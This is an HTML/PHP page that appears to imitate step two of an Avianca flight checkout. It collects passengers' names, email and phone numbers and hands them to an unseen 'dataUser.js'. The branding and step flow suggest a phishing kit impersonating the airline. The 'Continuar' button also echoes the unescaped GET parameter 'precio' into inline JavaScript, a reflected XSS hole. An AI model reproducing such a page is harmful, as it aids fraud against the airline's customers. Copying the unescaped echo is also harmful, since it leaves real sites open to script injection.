<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="media/icon.ico" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" integrity="sha384-xOolHFLEh07PJGoPkLv1IbcEPTNtaed2xpHsD9ESMhqIYd0nLMwNLD69Npy4HI+N" crossorigin="anonymous">
    <link rel="stylesheet" href="./css/style.css">

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/flatpickr/dist/flatpickr.min.css">

    <title>Avianca | #NACIONALES</title>
</head>

<body>
    <div class="header_check">
        <img src="media/logo-avianca-minimal.svg" class="logo">
        <img src="media/paso2.png" alt="" class="pasos">
    </div>

    <div class="body_check">
        <div class="formulario_">
            <p class="title">Datos personales:</p>
            <p class="title_2">Pasajero Adulto</p>
            <p class="text_info">Ingresa el primer nombre y el primer apellido como aparecen en el pasaporte o documento de identidad de cada pasajero.</p>

            <div class="box_datos">
                <div class="form_box">
                    <input type="text" placeholder="Nombre" id="nombre" name="name">
                </div>
                <div class="form_box">
                    <input type="text" placeholder="Apellido" id="apellido" name="lastname">
                </div>
            </div>

            <hr>

            <p class="title_2">Información de contacto</p>
            <p class="text_info">Estos datos serán utilizados para informarte sobre tu reserva.</p>

            <div class="box_datos">
                <div class="form_box">
                    <input type="text" placeholder="Correo" id="correo" name="email">
                </div>
                <div class="form_box">
                    <input type="number" placeholder="Número de telefono" id="celular" name="phone">
                </div>
            </div>

            <div class="box_check">
                <div class="form_check">
                    <input type="checkbox" id="terminos">
                    <label for="">Acepto el uso de mis datos personales para recibir promociones, ofertas y novedades que Avianca tiene para mí.</label>
                </div>

                <div class="form_check">
                    <input type="checkbox">
                    <label for="">Recordar mis datos para futuras compras.</label>
                </div>
            </div>

            <div class="total_r total_r2">
                <button type="button" onclick="siguiente('<?php echo $_GET['precio']; ?>');">
                    Continuar con silla aleatoria
                </button>
            </div>
        </div>
    </div>


    <div class="content_modal_e" id="error_">
        <div class="modal">
            <div class="close">
                <i class="far fa-times-circle" onclick="closeModale();"></i>
            </div>
            <div class="text">
                <p>Por favor completa todos <br> los campos y acepta los términos.</p>
            </div>
            <button type="button" onclick="closeModale();">OK</button>
        </div>
    </div>
</body>



<script src="js/jquery-3.7.1.min.js"></script>
<script src="js/dataUser.js"></script>
<div class="loader_inicial" id="loaderI">
    <img src="media/loading.png" alt="">
    <div class="lds-ring">
        <div></div>
        <div></div>
        <div></div>
        <div></div>
    </div>
</div>

<script>
    setTimeout(function() {
        $('#loaderI').hide();
    }, 3000);
</script>
</html>